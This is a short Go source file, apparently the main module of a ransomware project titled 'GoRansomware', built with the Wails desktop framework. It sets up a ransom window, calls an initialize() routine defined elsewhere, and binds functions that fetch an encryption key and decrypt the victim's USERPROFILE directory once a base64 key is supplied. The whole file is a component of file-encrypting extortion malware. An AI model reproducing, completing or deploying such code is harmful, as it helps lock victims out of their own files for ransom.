package main

import (
	_ "embed"
	b64 "encoding/base64"
	"os"

	"github.com/wailsapp/wails"
)

func basic() string {
	return "Hello World!"
}

func getEncryptionKeyWrapper() string {
	var result string
	result = getEncryptedKey()
	return result
}

func DecryptSystemWrapper(key string) string {
	keyBytes, _ := b64.StdEncoding.DecodeString(key)
	DecryptSystem(os.Getenv("USERPROFILE"), keyBytes)
	return "Finished Decryption."
}

//go:embed frontend/dist/app.js
var js string

//go:embed frontend/dist/app.css
var css string

func main() {

	initialize()

	app := wails.CreateApp(&wails.AppConfig{
		Width:  1024,
		Height: 768,
		Title:  "GoRansomware",
		JS:     js,
		CSS:    css,
		Colour: "#131313",
	})
	app.Bind(getEncryptionKeyWrapper)
	app.Bind(DecryptSystemWrapper)
	app.Run()
}
